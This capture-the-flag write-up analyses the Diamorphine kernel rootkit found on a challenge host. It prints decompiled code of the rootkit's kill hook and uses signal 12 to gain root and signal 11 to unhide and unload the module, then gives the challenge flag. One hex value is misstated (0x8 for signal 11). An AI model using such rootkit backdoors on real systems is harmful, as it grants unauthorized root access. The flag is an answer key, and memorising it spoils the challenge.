**Category**: Miscellaneous  
**Author**: Matt Kiely

![](./files/01%20-%20Root%20Canal/01%20-%20Root%20Canal.png)

---

Upon connecting to the challenge instance via SSH, there was a `README.txt` file in the user's home directory:

```
ctf@ip-10-1-100-212:~$ ls -lha
total 44K
drwxr-xr-x 6 ctf  ctf  4.0K Nov  1 00:04 .
drwxr-xr-x 4 root root 4.0K Sep 26 14:09 ..
-rw------- 1 ctf  ctf    53 Sep 26 14:19 .bash_history
-rw-r--r-- 1 ctf  ctf   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 ctf  ctf  3.7K Apr  4  2018 .bashrc
drwx------ 2 ctf  ctf  4.0K Sep 26 14:14 .cache
drwx------ 3 ctf  ctf  4.0K Oct 31 13:04 .gnupg
-rw-r--r-- 1 ctf  ctf   807 Apr  4  2018 .profile
-rw-r--r-- 1 ctf  ctf   142 Sep 26 14:12 README.txt
drwx------ 2 ctf  ctf  4.0K Sep 26 14:09 .ssh
ctf@ip-10-1-100-212:~$ ls -lha squiblydoo
ctf@ip-10-1-100-212:~$ cat README.txt
Once you fix your root your root canal, you'll see a new directory here!
Do some reconnaissance and you'll find the real root of the issue :)
```

During enumeration I discovered `/opt/.diamorphine` which is a rootkit I've encountered before on HackTheBox. I promptly downloaded `diamorphine.ko` and opened it into IDA, expecting it to be modified. It was, but not heavily. Everything I needed was in the `hacked_kill` function.

```C
__int64 __fastcall hacked_kill(__int64 a1)
{
  __int64 v1; // rax
  __int64 result; // rax
  _QWORD *v3; // rax
  __int64 v4; // rcx
  _QWORD *v5; // rax
  __int64 v6; // rdx
  _QWORD *v7; // rax
  __int64 v8; // rdx

  _fentry__(a1);
  v1 = *(a1 + 104);
  switch ( v1 )
  {
    case 0xC:
      give_root(a1);
      return 0LL;
    case 0xD:
      v5 = &init_task;
      do
      {
        v6 = v5[249];
        v5 = (v6 - 1992);
        if ( (v6 - 1992) == &init_task )
          return 4294967293LL;
      }
      while ( *(a1 + 112) != *(v6 + 256) );
      if ( v6 == 1992 )
        return 4294967293LL;
      *(v6 - 1956) ^= 0x10000000u;
      return 0LL;
    case 0xB:
      if ( module_hidden )
      {
        v3 = module_previous;
        v4 = *module_previous;
        *(v4 + 8) = &_this_module[1];
        _this_module[2] = v3;
        _this_module[1] = v4;
        *v3 = &_this_module[1];
        result = 0LL;
        module_hidden = 0;
      }
      else
      {
        v7 = _this_module[2];
        v8 = _this_module[1];
        module_previous = v7;
        *(v8 + 8) = v7;
        *v7 = v8;
        _this_module[1] = 0xDEAD000000000100LL;
        _this_module[2] = 0xDEAD000000000122LL;
        module_hidden = 1;
        return 0LL;
      }
      break;
    default:
      return (orig_kill)();
  }
  return result;
}
```

Thus I needed signal 12 (`0xC`) to grant me root privileges and 11 (`0x8`) to unhide the module so it could be unloaded.

Granting myself root privileges:

```
ctf@ip-10-1-100-212:~$ kill -12 $$
ctf@ip-10-1-100-212:~$ id
uid=0(root) gid=0(root) groups=0(root),1001(ctf)
```

This is what would happen if I then tried to unload the kernel module, despite being root:

```
ctf@ip-10-1-100-212:~$ rmmod diamorphine
rmmod: ERROR: ../libkmod/libkmod-module.c:793 kmod_module_remove_module() could not remove 'diamorphine': No such file or directory
rmmod: ERROR: could not remove module diamorphine: No such file or directory
```

Signal 11 fixed that:

```
ctf@ip-10-1-100-212:~$ kill -11 $$
ctf@ip-10-1-100-212:~$ rmmod diamorphine
```

And now there was a previously hidden item in the user's home directory:

```
ctf@ip-10-1-100-212:~$ ls -lha
total 44K
drwxr-xr-x 6 ctf  ctf  4.0K Nov  1 00:04 .
drwxr-xr-x 4 root root 4.0K Sep 26 14:09 ..
-rw------- 1 ctf  ctf    53 Sep 26 14:19 .bash_history
-rw-r--r-- 1 ctf  ctf   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 ctf  ctf  3.7K Apr  4  2018 .bashrc
drwx------ 2 ctf  ctf  4.0K Sep 26 14:14 .cache
drwx------ 3 ctf  ctf  4.0K Oct 31 13:04 .gnupg
-rw-r--r-- 1 ctf  ctf   807 Apr  4  2018 .profile
-rw-r--r-- 1 ctf  ctf   142 Sep 26 14:12 README.txt
d--------- 2 root root 4.0K Sep 26 14:12 squiblydoo
drwx------ 2 ctf  ctf  4.0K Sep 26 14:09 .ssh
ctf@ip-10-1-100-212:~$ ls -lha squiblydoo
total 12K
d--------- 2 root root 4.0K Sep 26 14:12 .
drwxr-xr-x 6 ctf  ctf  4.0K Nov  1 00:04 ..
---------- 1 root root   39 Sep 26 14:12 flag.txt
ctf@ip-10-1-100-212:~$ cat ~/squiblydoo/flag.txt
flag{ce56efc41f0c7b45a7e32ec7117cf8b9}
```

Flag: **flag{ce56efc41f0c7b45a7e32ec7117cf8b9}**

---

**Files:**
- [diamorphine.ko](./files//01%20-%20Root%20Canal/diamorphine.ko)